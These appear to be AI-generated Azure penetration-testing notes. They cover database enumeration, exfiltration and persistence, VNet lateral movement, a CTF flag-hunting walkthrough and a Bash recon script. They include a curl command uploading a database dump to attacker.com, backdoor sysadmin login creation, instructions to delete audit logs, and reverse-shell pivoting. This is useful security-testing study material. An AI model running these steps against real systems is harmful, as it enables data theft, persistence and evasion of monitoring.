# Azure Database

**Azure Penetration Testing** on **Azure Database Services** (Azure SQL,
MySQL, PostgreSQL, etc.).

# Azure Database Services 

Azure provides **PaaS-managed relational databases** like:

- Azure SQL Database (SQL Server)

- Azure Database for MySQL

- Azure Database for PostgreSQL

- Flexible Server and Hyperscale options

## Authentication Methods

- **Username + Password** (most common)

- **Azure Active Directory (AAD) Authentication**

- **Certificate-based access** (for PostgreSQL)

- Connections can be **restricted at network-level** via:

  - VNet service endpoints

  - Private endpoints

  - Firewall rules

  - Access from specific Azure resources (e.g., VMs, Functions)

# Enumeration

**🔹 List All Database Servers (SQL, MySQL, PostgreSQL)**

az sql server list -o table

az mysql server list -o table

az postgres server list -o table

**🔹 List Databases on a Server**

az sql db list --server \<server_name\> -o table

az mysql db list --server-name \<server_name\>

az postgres db list --server-name \<server_name\>

**🔹 List Firewall Rules (Look for overly permissive rules)**

az sql server firewall-rule list --server \<server_name\>

az mysql server firewall-rule list --server \<server_name\>

az postgres server firewall-rule list --server \<server_name\>

**🔹 List Virtual Network Rules**

az sql server vnet-rule list --server \<server_name\>

# Exploitation & Data Exfiltration

**🔸 Target: Password-based Auth (If IP or VNet allows)**

\# SQL Server

sqlcmd -S \<server_name\>.database.windows.net -U \<username\> -P
\<password\> -d \<database\>

\# MySQL

mysql -h \<server_name\>.mysql.database.azure.com -u \<username\> -p

\# PostgreSQL

psql "host=\<server_name\>.postgres.database.azure.com user=\<username\>
dbname=\<dbname\> sslmode=require"

**🔸 Target: Azure AD-based Authentication**

**1️⃣ Verify Identity**

az account show

az ad signed-in-user show

**2️⃣ List Assigned Roles**

az role assignment list --assignee \<user_or_service_principal\>

**3️⃣ Connect Using Azure CLI Token (SQL Server Example)**

az sql db show-connection-string --client ado.net --server
\<server_name\>

\# Generate token (you must be AAD user)

az account get-access-token --resource https://database.windows.net/
--query accessToken -o tsv

Use token in SQL client that supports AAD (e.g., sqlcmd, SSMS, Azure
Data Studio).

# Lateral Movement or Access via Compromised VM

If the DB is in a private VNet:

- **Compromise a VM in the same VNet** via RCE or stolen credentials.

- Use that VM as a **pivot point** to connect to the database via
  private endpoint or service endpoint.

mysql -h \<private_ip_or_dns\> -u \<username\> -p

**🧪 Data Exfiltration Methods**

- Use mysqldump, pg_dump, or bcp to export database contents.

\# MySQL example

mysqldump -h \<host\> -u \<user\> -p database_name \> dump.sql

- Transfer dump over HTTP/SFTP/SOCAT/Reverse shell from compromised VM.

**🛡️ Persistence Techniques**

- Add an AAD user to a DB role with admin privileges.

- Modify database user roles (if permissions allow).

- Alter stored procedures or triggers to establish callback channels.

**📌 Summary (Azure-Specific)**

| **Category** | **Tool/Command** |
|----|----|
| Enumerate Servers | az sql/mysql/postgres server list |
| Enumerate DBs | az sql db list, az mysql db list, az postgres db list |
| Auth Methods | Password, AAD token, Certificate (Postgres) |
| Exploitation via VM | Compromise VM in same VNet \> Connect to private DB endpoint |
| AAD Token Connection | az account get-access-token + sqlcmd/SSMS |
| Exfiltrate Data | mysqldump, pg_dump, sqlcmd, bcp, or over pivoted channel |

Would you like a visual flow diagram or attack chain example for Azure
Database exploitation scenarios?

Here is a detailed **attack flow** for targeting **Azure Database
Services** (SQL, MySQL, PostgreSQL) during a **penetration test**,
including steps for initial access, enumeration, lateral movement,
exploitation, and persistence.

# Azure Database Attack Flow

## 1. Recon & Target Identification

**Objective**: Discover exposed Azure SQL/MySQL/PostgreSQL databases.

**Actions:**

az account show \# Get current subscription

az sql server list \# Enumerate SQL servers

az mysql server list \# Enumerate MySQL servers

az postgres server list \# Enumerate PostgreSQL servers

az sql db list --server \<name\> \# List SQL databases on target

## 2. Initial Access

**Option A: Public Database Endpoint + Weak Passwords**

- Try default creds, credential stuffing, or bruteforce on database
  endpoints.

**Option B: Azure VM Compromise**

- Gain access to a VM in the same VNet/subnet as the DB (via RCE,
  password reuse, etc.).

- Check for Private Endpoint or Service Endpoint access.

\# From inside VM

mysql -h \<private-db-ip\> -u admin -p

**Option C: Web App SSRF or Command Injection**

- Abuse SSRF or RCE in a web app deployed on Azure to pivot to DB host.

## 3. Enumeration Post-Access

**From CLI:**

az sql db list --server \<target-server\>

az sql server firewall-rule list --server \<target-server\>

az sql server vnet-rule list --server \<target-server\>

**From inside DB (SQL Server Example):**

SELECT name FROM sys.databases;

SELECT \* FROM information_schema.tables;

SELECT \* FROM \<table\> -- Data exfil

## 4. Exploitation

**🔸 Password-based Access:**

mysql -h \<hostname\> -u \<username\> -p

psql "host=\<hostname\> dbname=\<dbname\> user=\<user\>
password=\<password\>"

sqlcmd -S \<server\>.database.windows.net -U user -P pass

**🔸 Azure AD Token-Based Auth:**

TOKEN=\$(az account get-access-token --resource
https://database.windows.net/ --query accessToken -o tsv)

sqlcmd -S \<server\>.database.windows.net -G -U \<aad_user\> -P \$TOKEN

## 5. Data Exfiltration

**Methods:**

- mysqldump, pg_dump, sqlcmd, or bcp to dump data.

- Encode and send over HTTP, SFTP, or reverse shell.

mysqldump -h host -u user -p dbname \> dump.sql

curl -F "file=@dump.sql" http://attacker.com/upload

## 6. Persistence

**Techniques:**

- Add a new user with admin role:

CREATE LOGIN backdoor_user WITH PASSWORD = 'P@ssw0rd!';

ALTER SERVER ROLE sysadmin ADD MEMBER backdoor_user;

- Abuse Azure Role Assignments (if permissions exist):

az role assignment create --assignee \<attacker\> --role "SQL DB
Contributor" --scope \<resource_id\>

## 7. Covering Tracks 

- Delete audit logs (if you have DB-level access).

- Remove temporary user accounts created.

- Clean firewall or role changes.

## Visual Summary

1.  **Recon** → List DB Servers

2.  **Initial Access** → Public endpoint / VM pivot / SSRF

3.  **Enumerate** → Databases, rules, roles

4.  **Exploit** → Connect with creds or token

5.  **Exfiltrate** → Dump data and export

6.  **Persist** → Backdoor users or IAM role assignment

7.  **(Optional) Cover** → Clean logs, revert changes

# Azure PenTest: SSO, Monitoring, Threat Detection, VNet & Lateral Movement

##  Azure SSO (Entra ID / Azure AD)

- **Purpose**: Centralized identity management and SSO across Azure
  resources and integrated SaaS apps.

- **Sources**: Uses Microsoft Entra ID (formerly Azure AD) or federated
  identity providers (e.g., Okta, SAML, Google).

- **PenTest Angle**:

  - Abuse misconfigured role assignments or excessive group permissions.

  - Extract tokens via browser session or abuse OAuth2 flows (token
    replay).

  - Use tools like **RoadTools** or **AadInternals** for offline token
    parsing and privilege enumeration.

## Azure Activity Logs & Monitoring

- **Azure Monitor / Activity Logs / Log Analytics / Microsoft Defender
  for Cloud**

- **Purpose**: Logs and audit trails for all Azure operations (control
  plane and data plane).

- **PenTest Angle**:

  - Check if logging is disabled or improperly scoped.

  - Azure logging cannot be truly disabled by regular users (unlike AWS
    CloudTrail).

  - Use tools like **AzureHound** or az monitor for enumeration.

**Useful Commands:**

az monitor activity-log list --max-events 10

az monitor diagnostic-settings list --resource
/subscriptions/\<sub\>/resourceGroups/\<rg\>/providers/\<type\>/\<name\>

## Azure Defender, WAF, Firewall, and Sentinel

**🔹 Azure WAF**

- Protects web apps from common attacks (SQLi, XSS).

- Use **wafw00f** to detect WAF presence.

- Test bypasses with payload fuzzing.

**🔹 Microsoft Defender for Cloud**

- Provides advanced threat detection (like AWS GuardDuty).

- Alert when unusual access, persistence techniques, or lateral movement
  is detected.

**🔹 Azure Sentinel (SIEM)**

- Collects logs from Defender, Activity Logs, Office365, etc.

- Useful to check if logs are forwarded to an external SOC or SIEM.

## Azure Virtual Network (VNet)

**🔸 Basics**

- VNets are Azure’s version of VPCs.

- Contains **subnets**, **route tables**, **NSGs** (Network Security
  Groups), and optional **firewalls**.

- Public subnets can access the Internet via **Internet Gateway (default
  route to 0.0.0.0/0)**.

- Private subnets use **NAT Gateway** or **Private Endpoints** for
  outbound traffic.

**🔸 Routing Destinations in Azure:**

| **Target** | **Meaning**                    |
|------------|--------------------------------|
| 0.0.0.0/0  | Internet Gateway / NAT Gateway |
| VNet       | Internal VNet routing          |
| Peering    | Route to Peered VNet           |
| Service EP | Azure service via Private Link |
| VPN GW     | On-premises via VPN            |

## Enumeration Techniques

**VNets & Subnets:**

az network vnet list

az network vnet show --name vnet-name --resource-group rg

az network vnet subnet list --vnet-name vnet-name --resource-group rg

**Route Tables:**

az network route-table list

az network route-table show --name name --resource-group rg

**Network Security Groups:**

az network nsg list

az network nsg show --name nsg-name --resource-group rg

**Peering Connections:**

az network vnet peering list --vnet-name vnet-name --resource-group rg

**VM Enumeration by VNet/Subnet:**

az vm list -d --query
"\[?networkProfile.networkInterfaces\[0\].id.contains('subnet-name')\]"
-o table

## Lateral Movement (VNet Peering Abuse)

**Scenario:**

- VNet A ↔ VNet B (peered), VNet B ↔ VNet C.

- You compromise a VM in VNet A.

- Use **routing tables** and **NSGs** to pivot via VNet B → C.

**Steps:**

1.  Enumerate peered VNets.

2.  Review routes (0.0.0.0/0 or VNet-specific routes).

3.  Identify accessible services in target subnets.

4.  Test connectivity with:

ping \<target\>

nmap -Pn \<target\> -p 22,80,443

5.  Deploy reverse shell or proxy tunnel (e.g., socat, chisel) to move
    laterally.

## Useful Tools

- **AzureHound**: Enumerates Entra ID relationships.

- **Stormspotter**: Visualizes Azure attack paths.

- **MicroBurst**: Azure post-exploitation toolkit.

- **RoadTools**: Entra ID token + offline enumeration.

- **chisel / socat / SSH tunnels**: Port forwarding and tunneling
  between subnets.

## Summary Attack Chain

1.  **Enumerate**: Identity, networks, peering, routes, NSGs

2.  **Access**: Initial foothold via misconfig, RCE, or weak creds

3.  **Escalate**: Token abuse or role enumeration

4.  **Pivot**: Use peering or NAT for lateral access

5.  **Exfil**: Dump sensitive data, extract tokens, or credentials

6.  **Persist**: Add new users, update NSGs, or deploy implants

7.  **Evade**: Modify routes/NSGs or abuse logging gaps

Would you like a **flowchart-style diagram** or **scripted enumeration
toolkit** for these Azure services?

Here is a **corrected, summarized, and rewritten version** of the
walkthrough, adapted specifically for **Azure penetration testing**,
while maintaining the **original attack flow and logic**:

# Azure PenTest – Credential Recon and Flag Discovery via Read-Only Role

**🧾 Lab Setup**

- Upon lab start, you’re provided with **temporary read-only
  credentials** for Azure.

- These credentials are used to query resources via CLI.

## Step 1: Configure Azure CLI with Temporary Credentials

In Azure, you'd typically use a **Service Principal**, **Entra ID
user**, or **Azure CLI login token**.

**Example (Service Principal):**

az login --service-principal -u \<appId\> -p \<password\> --tenant
\<tenantId\>

In AWS labs, this was done using:

aws configure --profile student

##  Step 2: Enumerate Cloud Resources (Recon)

Check what services are accessible with the read-only profile. Focus on:

- **Virtual Machines**

- **Storage Accounts (Blob/S3)**

- **Functions/Lambda**

- **User Data / Metadata**

- **Tags & IAM Policies**

**🖥️ Example: Enumerate VMs (EC2 equivalent)**

az vm list --query "\[\].{Name:name, RG:resourceGroup,
Location:location}" -o table

Check for tags or metadata that contain sensitive data like:

- Credentials

- Internal URLs

- Flags

**💡 Key Tip:**

Azure resources are region-bound. If you don’t know the region, loop
through known Azure regions.

**📜 Step 3: Extract VM User Data (Provisioning Scripts)**

In AWS, this was:

aws ec2 describe-instance-attribute --attribute userData ...

In Azure, use:

az vm run-command invoke --command-id RunShellScript --name \<vm-name\>
--resource-group \<rg\> --scripts "cat
/var/lib/cloud/instance/user-data.txt"

Decode any Base64 output. Look for references to blob containers or
script downloads.

**☁️ Step 4: Access Azure Blob Storage**

From decoded user-data, if you find blob container names or URLs:

az storage blob list --account-name \<storageaccount\> --container-name
\<container\> --auth-mode login

If object listing is denied (no list permission), try accessing **direct
blob paths** if known.

az storage blob download --account-name \<acc\> --container-name
\<container\> --name flag.txt --file flag.txt --auth-mode login

cat flag.txt

This mirrors:

aws s3 cp s3://bucket/key .

**🚩 Example Flags Recovered**

- **FLAG1** from VM tags in ap-southeast-2

- **FLAG2** from developers-secret-bucket (dave-shared-bucket/flag.txt)

**📦 Step 5: Enumerate Other Accessible Storage Accounts**

az storage account list --query "\[\].{Name:name, Location:location}" -o
table

Check if access to any other containers is available using known names:

az storage blob list --account-name temporarypublicimagestore
--container-name root

If list access is denied, try direct access if the path or blob name is
leaked.

**🔄 Step 6: Cross-Service Access**

Look for access to **other services** (e.g., Azure Functions, Logic
Apps, Key Vaults) that may interact with blob storage:

- Leak access keys

- Trigger internal data flows

- Store secrets/tokens in blob

az functionapp list

az logic workflow list

az keyvault list

**Summary Flow (Azure Equivalents)**

| **Phase**         | **Action**                                             |
|-------------------|--------------------------------------------------------|
| Configure         | Set up credentials via az login                        |
| Recon             | List VMs, Storage Accounts, and other services         |
| User Data         | Extract and decode provisioning scripts for secrets    |
| Tag Harvesting    | Scan for flags or sensitive data in tags               |
| Blob Access       | Use direct blob download if list is restricted         |
| Cross-service Use | Look for interaction from Functions or Apps to Storage |
| Exfiltration      | Download secrets, flags, or internal scripts           |

Would you like a **bash script version** or an **Azure CLI wrapper** to
automate this type of recon workflow?

Here’s a **Bash-based Azure CLI automation script** for recon and flag
discovery in an Azure penetration test scenario using **read-only
credentials** (or low-privilege service principal).

## azure_recon.sh — Automated Azure Recon Script

\#!/bin/bash

\# Usage: ./azure_recon.sh

\# Precondition: Already logged in using \`az login\` or \`az login
--service-principal ...\`

echo "\[\*\] Starting Azure Recon..."

\# Common Azure regions to enumerate (you can expand this list)

REGIONS=("eastus" "westeurope" "southeastasia" "australiaeast"
"uksouth")

echo "\[\*\] Enumerating VMs across regions..."

for region in "\${REGIONS\[@\]}"; do

echo "\[\*\] Checking region: \$region"

az vm list -o table --query
"\[?location=='\$region'\].{Name:name,RG:resourceGroup,Location:location,Tags:tags}"
2\>/dev/null

done

echo "\[\*\] Extracting possible User Data from Linux VMs..."

VM_LIST=\$(az vm list --query "\[\].{name:name, rg:resourceGroup}" -o
tsv)

while IFS=\$'\t' read -r name rg; do

echo "\[\*\] Checking VM: \$name in Resource Group: \$rg"

az vm run-command invoke \\

--command-id RunShellScript \\

--name "\$name" \\

--resource-group "\$rg" \\

--scripts "cat /var/lib/cloud/instance/user-data.txt" \\

--query "value\[\].message" -o tsv 2\>/dev/null

done \<\<\< "\$VM_LIST"

echo "\[\*\] Enumerating accessible storage accounts..."

az storage account list --query "\[\].{Name:name,
ResourceGroup:resourceGroup}" -o table

echo "\[\*\] Attempting to list blob containers (may fail if no
permission)..."

ACCOUNTS=\$(az storage account list --query "\[\].name" -o tsv)

for acc in \$ACCOUNTS; do

echo "\[\*\] Storage Account: \$acc"

az storage container list --account-name "\$acc" --auth-mode login
--query "\[\].name" -o table 2\>/dev/null

done

echo "\[\*\] Trying to download common files like 'flag.txt' if
container names are known..."

\# Modify/add more containers or paths based on user-data findings

for acc in \$ACCOUNTS; do

for container in "dave-shared-bucket" "dev-data" "public" "shared"; do

echo "\[\*\] Trying: \$acc / \$container / flag.txt"

az storage blob download \\

--account-name "\$acc" \\

--container-name "\$container" \\

--name "flag.txt" \\

--file "./\${acc}\_\${container}\_flag.txt" \\

--auth-mode login 2\>/dev/null && echo "\[+\] Downloaded:
\${acc}\_\${container}\_flag.txt"

done

done

echo "\[\*\] Enumerating Function Apps (possible cross-service
access)..."

az functionapp list --query "\[\].{Name:name, RG:resourceGroup,
Location:location}" -o table

echo "\[\*\] Enumerating Key Vaults (check for misconfigured access)..."

az keyvault list --query "\[\].{Name:name, Location:location}" -o table

echo "\[\*\] Script completed."

**Prerequisites**

- Logged into Azure CLI with appropriate credentials:

- az login --service-principal -u APP_ID -p PASSWORD --tenant TENANT_ID

- Or via user credentials:

- az login

- jq and base64 are useful if decoding is needed for user data.
